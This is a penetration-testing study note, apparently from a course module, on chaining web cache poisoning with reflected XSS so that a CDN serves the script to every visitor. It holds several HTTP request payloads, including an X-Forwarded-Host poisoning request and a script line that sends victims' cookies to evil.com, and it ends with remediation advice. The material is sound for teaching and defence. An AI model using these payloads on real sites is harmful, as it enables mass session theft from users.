---
tags: [vapt, cache, xss, advanced]
difficulty: advanced
module: "27 - Web Cache Poisoning and Deception"
topic: "27.07 Cache Poisoning to Deliver XSS"
---

# 27.07 — Cache Poisoning to Deliver XSS

## What is it?
**Cache Poisoning to Deliver XSS** is the process of weaponizing a Web Cache Poisoning vulnerability to execute Cross-Site Scripting (XSS) in the browsers of legitimate users.

Normally, Reflected XSS is considered a lower-severity vulnerability because the attacker must convince the victim to click a highly suspicious link (e.g., `https://target.com/search?q=<script>alert(1)</script>`). 

By chaining Reflected XSS with Cache Poisoning, the attacker turns Reflected XSS into **Stored XSS** at the CDN layer. The attacker sends the malicious payload once. The CDN caches the malicious HTML. Then, the attacker walks away. Every legitimate user who visits the normal, clean URL (e.g., `https://target.com/`) will receive the cached HTML containing the XSS payload. 

Think of it like putting up a billboard. Normally (Reflected XSS), you have to hand a flyer to a specific person on the street. With Cache Poisoning, you break into the advertising company, replace the master digital file for the Times Square billboard with your own image, and let the infrastructure broadcast your message to a million people automatically.

## ASCII Diagram
```text
================================================================================
                    WEAPONIZING CACHE POISONING FOR XSS
================================================================================

[1. The Vulnerable Endpoint (Reflected XSS via Unkeyed Header)]
The Backend reflects the `X-Forwarded-Host` header into an image tag:
Response: <img src="http://[X-Forwarded-Host]/logo.png">

[2. The Poisoning Attack]
Attacker sends:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: a" onerror="alert('HACKED')

[3. The Backend Generates the Payload]
Response: <img src="http://a" onerror="alert('HACKED')/logo.png">

[4. The Cache Saves It]
Cache Key: GET / | target.com

[5. The Mass Exploitation]
10,000 legitimate users navigate to `https://target.com/`.
The Cache serves the poisoned HTML to all of them.
The image fails to load, triggering `onerror="alert('HACKED')"`.
10,000 browsers execute the attacker's Javascript simultaneously!
================================================================================
```

## How to Find It
- **Manual steps:**
  1. Use Param Miner to find Unkeyed Inputs (Headers or Fat GET bodies).
  2. Verify that the Unkeyed Input is reflected in the backend's HTTP response.
  3. Determine the context of the reflection (e.g., inside an HTML attribute, between HTML tags, inside a Javascript variable, or inside a JSON response).
  4. Craft an XSS payload that breaks out of the context (e.g., `"><script>alert(1)</script>` or `'-alert(1)-'`).
  5. Send the payload with a cachebuster `?cb=123`.
  6. Verify the cachebuster URL returns your executing XSS payload.

## How to Exploit It
- **Step-by-step walkthrough:**
  Let's exploit a site that dynamically loads a Javascript tracking file based on the `X-Forwarded-Host` header.
  1. Normal HTML: `<script src="https://target.com/assets/tracker.js"></script>`
  2. Unkeyed Input: `X-Forwarded-Host`
  3. **Setup Malicious Server:** You host a file at `https://evil.com/assets/tracker.js`. Inside this file, you write your XSS payload:
     `document.location='http://evil.com/steal?cookie='+document.cookie;`
  4. **Poison the Live Cache:** Wait for the homepage cache to expire. Send the payload:
     ```http
     GET / HTTP/1.1
     Host: target.com
     X-Forwarded-Host: evil.com
     ```
  5. The Cache saves the HTML containing `<script src="https://evil.com/assets/tracker.js"></script>`.
  6. **Impact:** Every user who visits the homepage will download `tracker.js` from your server and execute the cookie-stealing script.

- **Actual payloads:**
  **Injecting XSS via X-Original-URL (Overrides path for a specific 404 reflection):**
  ```http
  GET / HTTP/1.1
  Host: target.com
  X-Original-URL: /<script>alert('XSS')</script>
  ```
  *(If the 404 page says "Path `[X-Original-URL]` not found", the cache will save the XSS payload on the homepage!).*

## Real-World Example
A critical vulnerability was found on a massive web forum. The forum used an unkeyed `X-Forwarded-Scheme` header. If set to `http`, the forum issued a 301 Redirect to the HTTPS version of the requested URL. However, the developer made a mistake: the redirect HTML body also contained a clickable link to the URL, and it was NOT URL-encoded.
The attacker sent:
`GET /search?q=123"><script>alert(1)</script> HTTP/1.1`
`X-Forwarded-Scheme: http`
The backend generated a 301 Redirect, but the HTML body contained the unescaped XSS payload. The Varnish cache saved this 301 response. When a user searched for that specific term, the cache returned the 301 response, but because the browser parses the HTML body of a 301 *before* redirecting, the XSS payload executed instantly.

## How to Fix It
- **Developer remediation:**
  1. **Never trust unkeyed inputs** for building HTML responses. Use the strictly validated `Host` header.
  2. **Context-Aware Encoding:** Even if an input is used, it MUST be strictly HTML-encoded before being reflected in the DOM, regardless of whether it came from a header or a URL parameter.

## Chaining Opportunities
- This vuln + [[27.03 Cache Poisoning via X-Forwarded-Host]] → The primary delivery mechanism for rewriting `<script src="...">` tags.
- This vuln + [[27.06 Cache Poisoning via Fat GET]] → Using Fat GET bodies to smuggle XSS payloads into JSONP or search parameters.

## Related Notes
- [[27.01 What is Web Caching?]]
- [[27.08 Cache Poisoning to Redirect Users]]
